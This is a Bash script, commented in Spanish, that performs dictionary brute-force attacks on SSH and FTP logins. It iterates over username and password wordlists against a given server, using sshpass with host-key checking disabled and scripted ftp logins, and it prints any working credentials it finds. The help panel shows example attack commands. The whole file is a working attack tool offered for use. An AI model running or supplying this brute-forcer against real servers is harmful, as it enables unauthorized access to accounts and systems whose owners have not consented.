#!/bin/bash

#Colours
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

# Capturando CTRL + C
function ctrl_c(){
    echo -e "\n${red}[!] Saliendo ...${end}"
    tput cnorm; exit 1
}

trap ctrl_c INT

# Panel de ayuda
function helpPanel(){
    echo -e "\n${green}[+]${end}${gray} Ataques de fuerza bruta por SSH y FTP${end}"

    echo -e "\n${yellow}[i]${end}${gray} Uso: $0 -s {SSH|FTP} [OPCIONES] -i SERVIDOR${end}"

    echo -e "\n${yellow}[i]${end}${gray} Opciones:${end}"
    echo -e "\t${purple}-h${end}${gray} Visualizar este panel de ayuda${end}"
    echo -e "\t${purple}-s${end}${gray} Indiciar protocolo [SSH/FTP]${end}"
    echo -e "\t${purple}-i${end}${gray} Indicar servidor${end}"
    echo -e "\t${purple}-u${end}${gray} Indicar usuario${end}"
    echo -e "\t${purple}-w${end}${gray} Indicar diccionario de contraseñas${end}"
    echo -e "\t${purple}-l${end}${gray} Indicar diccionario de usuarios${end}"
    echo -e "\t${purple}-p${end}${gray} Indicar contraseña${end}"

    echo -e "\n${yellow}[i]${end}${gray} Ejemplos:${end}"
    # Ejemplos SSH
    echo -e "\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de contraseñas al servicio SSH${end}"
    echo -e "\t\t${blue}$0 -s SSH -u pepe -w passwordsList.txt -i 11.11.11.11${end}"

    echo -e "\n\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de usuarios al servicio SSH${end}"
    echo -e "\t\t${blue}$0 -s SSH -l usersList.txt -p 'P@Ssw0rd*.!' -i 11.11.11.11${end}"

    echo -e "\n\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de usuarios y contraseñas al servicio SSH${end}"
    echo -e "\t\t${blue}$0 -s SSH -l usersList.txt -w passwordsList.txt -i 11.11.11.11${end}"

    # Ejemplos FTP
    echo -e "\n\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de contraseñas al servicio FTP${end}"
    echo -e "\t\t${blue}$0 -s FTP -u pepe -w passwordsList.txt -i 11.11.11.11${end}"

    echo -e "\n\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de usuarios al servicio FTP${end}"
    echo -e "\t\t${blue}$0 -s FTP -l usersList.txt -p 'P@Ssw0rd*.!' -i 11.11.11.11${end}"

    echo -e "\n\t${green}[+]${end}${gray} Ataque de fuerza bruta por diccionario de usuarios y contraseñas al servicio FTP${end}"
    echo -e "\t\t${blue}$0 -s FTP -l usersList.txt -w passwordsList.txt -i 11.11.11.11${end}"

    echo -e "\n${green};)${end}${gray} Espero que te sirva de ayuda este programa${end}${red} <3${end}"
}

# Ataque de fuerza bruta por diccionario de contraseñas por SSH y por FTP
function sshPassBruteForce(){
    tput civis
    
    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}"

    for password in $(cat "$wordlist"); do
        sshpass -p "$password" ssh -o "StrictHostKeyChecking no" $user@$servidor 'whoami' > /dev/null 2>&1

        if [ $? -eq 0 ]; then
            declare -i success=1
            echo -e "\n${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $user:$password${end}"
            tput cnorm
            break
        fi
    done; tput cnorm

    if [ $success == 0 ]; then
        echo -e "\n${red}[!]${end}${gray} No se encontro ninguna contraseña valida o el servicio SSH no esta habilitado en la maquina${end}${yellow} '$servidor'${end}${end}"
    fi
}

function ftpBruteForce(){
    tput civis

    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}"

    for pass in $(cat $wordlist); do
        echo user $user $pass | ftp -n $servidor > ftp_try_login.tmp

        if [ "$(cat ftp_try_login.tmp | grep -i "Login incorrect" > /dev/null && echo $?)" != 0 ]; then
            declare -i success=1
            echo -e "\n${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $user:$pass${end}"
            rm ftp_try_login.tmp
            tput cnorm
            break
        fi  
    done; tput cnorm
    
    if [ $success == 0 ]; then
        echo -e "\n${red}[!]${end}${gray} No se encontro ningun usuario valido${end}"
        rm ftp_try_login.tmp
    fi
}

# Ataque de fuerza bruta por diccionario de usuarios por SSH y por FTP
function sshUserBruteForce(){
    tput civis

    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}"

    for users in $(cat $userlist); do
        sshpass -p "$default_pass" ssh -o "StrictHostKeyChecking no" $users@$servidor 'whoami' > /dev/null 2>&1

        if [ $? -eq 0 ]; then
            declare -i success=1
            echo -e "\n${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $users:$default_pass${end}"
            
            tput cnorm
            break
        fi  
    done; tput cnorm

    if [ $success == 0 ]; then
        echo -e "\n${red}[!]${end}${gray} No se encontro ningun usuario valido o el servicio SSH no esta habilitado en la maquina${end}${yellow} '$servidor'${end}${end}"
    fi
}

function ftpUserBruteForce(){
    tput civis

    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}"

    for users in $(cat $userlist); do
        echo user $users $default_pass | ftp -n $servidor > ftp_try_login.tmp

        if [ "$(cat ftp_try_login.tmp | grep -i "Login incorrect" > /dev/null && echo $?)" != 0 ]; then
            declare -i success=1
            echo -e "\n${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $users:$default_pass${end}"
            rm ftp_try_login.tmp
            tput cnorm
            break
        fi
    done; tput cnorm

    if [ $success == 0 ]; then
        echo -e "\n${red}[!]${end}${gray} No se encontro ningun usuario valido${end}"
        rm ftp_try_login.tmp
    fi
}

# Ataque de fuerza bruta por diccionario de contraseñas y diccionario de usuarios por SSH y por FTP

function sshUserPassBruteForce(){
    tput civis

    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}\n"

    for users in $(cat $userlist); do
        tput civis
        for pass in $(cat $wordlist); do
            sshpass -p "$pass" ssh -o "StrictHostKeyChecking=no" $users@$servidor 'whoami' > /dev/null 2>&1

            if [ $? -eq 0 ]; then
                declare -i success=1
                echo -e "${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $users:$pass${end}"
                
                tput cnorm
                break
            fi  
        done
    done; tput cnorm

    if [ $success == 0 ]; then
        echo -e "${red}[!]${end}${gray} No se encontro ningun usuario valido o el servicio SSH no esta habilitado en la maquina${end}${yellow} '$servidor'${end}${end}"
    fi
}

function ftpUserPassBruteForce(){
    tput civis

    declare -i success=0
    echo -e "\n${green}[+]${end}${gray} Realizando ataque de fuerza bruta, porfavor espere ...${end}\n"

    for users in $(cat $userlist); do
        tput civis
        for pass in $(cat $wordlist); do
            echo user $users $pass | ftp -n $servidor > ftp_try_login.tmp

            if [ "$(cat ftp_try_login.tmp | grep -i "Login incorrect" > /dev/null && echo $?)" != 0 ]; then
                declare -i success=1
                echo -e "${green}[+]${end}${gray} Autenticacion encontrada:${end}${yellow} $users:$pass${end}"
                rm ftp_try_login.tmp
                tput cnorm
                break
            fi    
        done
    done; tput cnorm

    if [ $success == 0 ]; then
        echo -e "${red}[!]${end}${gray} No se encontro ningun usuario valido${end}"
        rm ftp_try_login.tmp
    fi
}

declare -i parameter_counter=0

while getopts "hs:i:u:w:l:p:" arg; do
    case $arg in
        h) ;;
        s) service="$OPTARG"; let parameter_counter+=1;;
        i) servidor="$OPTARG"; let parameter_counter+=2;;
        u) user="$OPTARG"; let parameter_counter+=3;;
        w) wordlist="$OPTARG"; let parameter_counter+=4;;
        l) userlist="$OPTARG"; let parameter_counter+=5;;
        p) default_pass="$OPTARG"; let parameter_counter+=6;;
    esac
done

if [ $parameter_counter == 0 ]; then
    helpPanel
elif [ "$service" == "SSH" ] || [ "$service" == "ssh" ] && [ $servidor ] && [ $user ] && [ $wordlist ]; then
    sshPassBruteForce "$service" "$user" "$wordlist" "$servidor"
elif [ "$service" == "SSH" ] || [ "$service" == "ssh" ] && [ $servidor ] && [ $userlist ] && [ $default_pass ]; then
    sshUserBruteForce "$service" "$userlist" "$default_pass" "$servidor"
elif [ "$service" == "SSH" ] || [ "$service" == "ssh" ] && [ $servidor ] && [ $userlist ] && [ $wordlist ]; then
    sshUserPassBruteForce "$service" "$userlist" "$wordlist" "$servidor"
elif [ "$service" == "FTP" ] || [ "$service" == "ftp" ] && [ $servidor ] && [ $user ] && [ $wordlist ]; then
    ftpBruteForce "$service" "$user" "$wordlist" "$servidor"
elif [ "$service" == "FTP" ] || [ "$service" == "ftp" ] && [ $servidor ] && [ $userlist ] && [ $default_pass ]; then
    ftpUserBruteForce "$service" "$userlist" "$default_pass" "$servidor"
elif [ "$service" == "FTP" ] || [ "$service" == "ftp" ] && [ $servidor ] && [ $userlist ] && [ $wordlist ]; then
    ftpUserPassBruteForce "$service" "$userlist" "$wordlist" "$servidor"
else
    helpPanel
fi
